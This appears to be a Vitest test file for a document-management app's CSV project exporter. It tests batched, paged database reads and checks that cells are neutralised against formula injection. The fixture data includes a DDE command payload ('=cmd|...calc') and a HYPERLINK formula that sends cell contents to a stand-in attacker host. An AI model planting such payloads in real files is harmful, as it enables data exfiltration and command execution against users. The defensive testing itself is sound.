// projects Round G — J8 PROJECT-MODEL, lib/projectExport.ts:
//
//   PERF-2  the org-wide export reads its rows in bulk — per batch of 100
//           projects one checkout read and one register read, then the
//           documents — never one serial round trip per project; it reports
//           progress, can be cancelled, and a refused read fails the export
//           instead of shipping an empty section
//   PM-10   every cell goes through lib/csvSafe: a project named =1+1 is text,
//           and the org export's "#### name ####" header line is a cell too
//
// The mock enforces PostgREST's max-rows: a response never carries more
// than 1000 rows, whatever the query asked for — so a read that is not
// paged to exhaustion is visibly short here, as it is in production.

import { describe, it, expect, vi, beforeEach } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";

const MAX_ROWS = 1000; // PostgREST max-rows
const state = vi.hoisted(() => ({
  rows: {} as Record<string, Array<Record<string, unknown>>>,
  errors: {} as Record<string, { message: string } | undefined>,
  from: [] as string[],
  ranges: [] as Array<[string, number, number]>,
}));
function chain(table: string) {
  const preds: Array<(r: Record<string, unknown>) => boolean> = [];
  let range: [number, number] | null = null;
  const c: Record<string, unknown> = {};
  const result = () => {
    const err = state.errors[table];
    if (err) return { data: null, error: err };
    const all = (state.rows[table] ?? []).filter((r) => preds.every((p) => p(r)));
    const [from, to] = range ?? [0, all.length - 1];
    return { data: all.slice(from, Math.min(to + 1, from + MAX_ROWS)), error: null };
  };
  const h: ProxyHandler<Record<string, unknown>> = {
    get(_t, prop: string) {
      if (prop === "then") return (resolve: (v: unknown) => void) => resolve(result());
      return (...args: unknown[]) => {
        const [col, v] = args as [string, unknown];
        if (prop === "eq") preds.push((r) => r[col] === v);
        if (prop === "in") preds.push((r) => (v as unknown[]).includes(r[col]));
        if (prop === "range") { range = [args[0] as number, args[1] as number]; state.ranges.push([table, range[0], range[1]]); }
        if (prop === "maybeSingle") {
          const r = result();
          return Promise.resolve({ data: r.error ? null : ((r.data as unknown[])[0] ?? null), error: r.error });
        }
        return new Proxy(c, h);
      };
    },
  };
  return new Proxy(c, h);
}
vi.mock("@/lib/supabase", () => ({ supabase: { from: (t: string) => { state.from.push(t); return chain(t); } } }));

import { buildAllProjectsCsv, buildProjectCsv, ExportCancelledError, EXPORT_PROJECT_BATCH, EXPORT_PAGE_ROWS } from "@/lib/projectExport";
import { csvCell } from "@/lib/csvSafe";

function seed(n: number) {
  state.rows.projects = Array.from({ length: n }, (_, i) => ({
    id: `p${i}`, org_id: "o1", name: `Project ${String(i).padStart(3, "0")}`, status: "active", visibility: "public",
  }));
  state.rows.checkout_sessions = state.rows.projects.map((p, i) => ({ id: `s${i}`, project_id: p.id, document_id: `d${i}`, user_name: "ann", mode: "edit", status: "active", started_at: "2026-09-01" }));
  state.rows.project_documents = state.rows.projects.map((p, i) => ({ id: `l${i}`, project_id: p.id, document_id: `d${i}` }));
  state.rows.documents = state.rows.projects.map((_, i) => ({ id: `d${i}`, document_number: `ISO-${i}`, title: "Line", rev: "A", status: "Issued", library_id: "lib" }));
}

beforeEach(() => { state.rows = {}; state.errors = {}; state.from = []; state.ranges = []; });

/** RFC 4180 records → cells (quoted fields may hold commas, doubled quotes
 *  and line breaks) — how a spreadsheet splits the file. */
function parseCsv(text: string): string[][] {
  const out: string[][] = [];
  let row: string[] = [], cell = "", q = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (q) {
      if (ch === '"' && text[i + 1] === '"') { cell += '"'; i++; }
      else if (ch === '"') q = false;
      else cell += ch;
    } else if (ch === '"' && cell === "") q = true;
    else if (ch === ",") { row.push(cell); cell = ""; }
    else if (ch === "\n") { row.push(cell); out.push(row); row = []; cell = ""; }
    else cell += ch;
  }
  row.push(cell); out.push(row);
  return out;
}

describe("PERF-2 — the round-trip count does not grow with every project", () => {
  it("3 projects and 99 projects cost the same number of reads; 150 costs one more batch, not 147 more round trips", async () => {
    seed(3);
    await buildAllProjectsCsv("o1");
    const small = state.from.length;
    state.from = []; seed(99);
    await buildAllProjectsCsv("o1");
    expect(state.from.length).toBe(small);
    state.from = []; seed(150);
    await buildAllProjectsCsv("o1");
    expect(EXPORT_PROJECT_BATCH).toBe(100);
    // 1 projects read + per batch (checkouts + register + documents) — two batches.
    expect(state.from).toEqual(["projects", "checkout_sessions", "project_documents", "documents", "checkout_sessions", "project_documents", "documents"]);
  });

  it("each project's section carries only its own rows", async () => {
    seed(2);
    const csv = await buildAllProjectsCsv("o1");
    const [, first, second] = csv.split(/^#### /m);
    expect(first).toContain("ISO-0");
    expect(first).not.toContain("ISO-1");
    expect(second).toContain("ISO-1");
  });

  it("progress is reported and a cancel stops the export before anything is built", async () => {
    seed(150);
    const seen: Array<[number, number]> = [];
    await buildAllProjectsCsv("o1", { onProgress: (p) => seen.push([p.done, p.total]) });
    expect(seen).toEqual([[0, 150], [100, 150], [150, 150]]);
    const ctrl = new AbortController();
    ctrl.abort();
    await expect(buildAllProjectsCsv("o1", { signal: ctrl.signal })).rejects.toBeInstanceOf(ExportCancelledError);
  });

  it("a batch carrying more rows than PostgREST's 1000-row cap is read page by page — no project's checkouts are cut off", async () => {
    // 100 projects × 12 historical sessions = 1,200 rows in ONE batch.
    seed(100);
    state.rows.checkout_sessions = state.rows.projects.flatMap((p, i) => Array.from({ length: 12 }, (_, k) => ({
      id: `s${String(i).padStart(3, "0")}-${String(k).padStart(2, "0")}`, project_id: p.id, document_id: `d${i}`,
      user_name: "ann", mode: "edit", status: k === 0 ? "active" : "checked_in", started_at: "2026-09-01",
    })));
    expect(EXPORT_PAGE_ROWS).toBe(1000);
    const csv = await buildAllProjectsCsv("o1");
    // the checkout read asked for a SECOND window after the first came back full
    expect(state.ranges.filter(([t]) => t === "checkout_sessions")).toEqual([["checkout_sessions", 0, 999], ["checkout_sessions", 1000, 1999]]);
    // every project's section carries all twelve — none shows CHECKOUTS (0) or a short count
    const counts = [...csv.matchAll(/^CHECKOUTS \((\d+)\)$/gm)].map((m) => Number(m[1]));
    expect(counts).toHaveLength(100);
    expect(new Set(counts)).toEqual(new Set([12]));
    // and the register read, under the cap, is ONE window
    expect(state.ranges.filter(([t]) => t === "project_documents")).toEqual([["project_documents", 0, 999]]);
  });

  it("an org with more than 1000 projects is read page by page too", async () => {
    seed(1001);
    const seen: Array<[number, number]> = [];
    await buildAllProjectsCsv("o1", { onProgress: (p) => seen.push([p.done, p.total]) });
    expect(state.ranges.filter(([t]) => t === "projects")).toEqual([["projects", 0, 999], ["projects", 1000, 1999]]);
    expect(seen.at(-1)).toEqual([1001, 1001]);
  });

  it("a refused read fails the export — never an empty DOCUMENTS section in a file that gets mailed", async () => {
    seed(2);
    state.errors.checkout_sessions = { message: "permission denied for table checkout_sessions" };
    await expect(buildAllProjectsCsv("o1")).rejects.toThrow(/could not read checkouts: You don't have permission to see this\./);   // REL-3
  });

  it("the Export All button cannot start a second run and shows progress with a cancel", () => {
    const page = readFileSync(join(process.cwd(), "app/(protected)/projects/page.tsx"), "utf8");
    expect(page).toMatch(/if \(!activeOrgId \|\| exportAbort\.current\) return;/);
    expect(page).toMatch(/disabled=\{!activeOrgId \|\| projects\.length === 0 \|\| exportProgress !== null\}/);
    expect(page).toMatch(/Exporting \$\{exportProgress\.done\}\/\$\{exportProgress\.total\}…/);
    expect(page).toMatch(/onClick=\{\(\) => exportAbort\.current\?\.abort\(\)\}/);
  });
});

describe("PM-10 — the exported cells are inert text", () => {
  it("a project named =1+1 and a purpose starting with =cmd are written as quoted, apostrophe-prefixed text", async () => {
    state.rows.projects = [{ id: "p1", org_id: "o1", name: "=1+1", status: "active", description: "@SUM(A1:A9)" }];
    state.rows.checkout_sessions = [{ id: "s1", project_id: "p1", document_id: "d1", user_name: "+ann", mode: "edit", purpose: "=cmd|'/C calc'!A1", status: "active", started_at: "2026-09-01" }];
    state.rows.project_documents = [];
    state.rows.documents = [{ id: "d1", document_number: "-ISO-1", title: "Line", rev: "A", status: "Issued", library_id: "lib" }];
    const built = await buildProjectCsv("p1", "o1");
    const lines = built!.csv.split("\n");
    expect(lines).toContain(`Name,"'=1+1"`);
    expect(lines).toContain(`Description,"'@SUM(A1:A9)"`);
    expect(built!.csv).toContain(`"'+ann",edit,"'=cmd|'/C calc'!A1"`);
    expect(built!.csv).toContain(`"'-ISO-1",Line,A,Issued,lib`);
    // No cell in the file begins with a formula character.
    for (const line of lines) for (const cell of line.split(",")) expect(/^[=+@\t\r-]/.test(cell), cell).toBe(false);
  });

  it("a typed number is written as a number — a negative amount stays summable; only TEXT that leads with a formula character is neutralised", () => {
    expect(csvCell(-1250)).toBe("-1250");
    expect(csvCell(0.5)).toBe("0.5");
    expect(csvCell(Number.NaN)).toBe("");
    expect(csvCell("-1250")).toBe(`"'-1250"`);
    expect(csvCell("=1+1")).toBe(`"'=1+1"`);
  });

  it("the org export's section header is a cell too: a name carrying a line break or a comma starts no live formula", async () => {
    state.rows.projects = [
      { id: "p1", org_id: "o1", name: 'x\n=HYPERLINK("https://evil.example/?d="&A2,"Open")', status: "active" },
      { id: "p2", org_id: "o1", name: "y,=1+1", status: "active" },
    ];
    const csv = await buildAllProjectsCsv("o1");
    const lines = csv.split("\n");
    // the header folds the line break and is ONE quoted cell on ONE physical line
    expect(lines).toContain(`"#### x =HYPERLINK(""https://evil.example/?d=""&A2,""Open"") ####"`);
    expect(lines).toContain(`"#### y,=1+1 ####"`);
    // read the file the way a spreadsheet does (RFC 4180 records): no cell begins with a formula character
    const cells = parseCsv(csv).flat();
    const live = cells.filter((c) => /^[=+@\t\r-]/.test(c));
    expect(live, live.join(" | ")).toEqual([]);
    expect(cells).toContain('#### x =HYPERLINK("https://evil.example/?d="&A2,"Open") ####');
    expect(cells).toContain("#### y,=1+1 ####");
  });

  it("before the fix the raw header line opened as a live formula (the RFC 4180 reading of the old output)", () => {
    const old = `#### x\n=HYPERLINK("https://evil.example/?d="&A2,"Open") ####`;
    expect(parseCsv(old).flat().some((c) => c.startsWith("=HYPERLINK"))).toBe(true);
  });

  it("the exporter's only cell encoder is lib/csvSafe", () => {
    const src = readFileSync(join(process.cwd(), "lib/projectExport.ts"), "utf8");
    expect(src).toMatch(/import \{ csvLine \} from "@\/lib\/csvSafe";/);
    expect(src).not.toMatch(/function csvField/);
  });
});
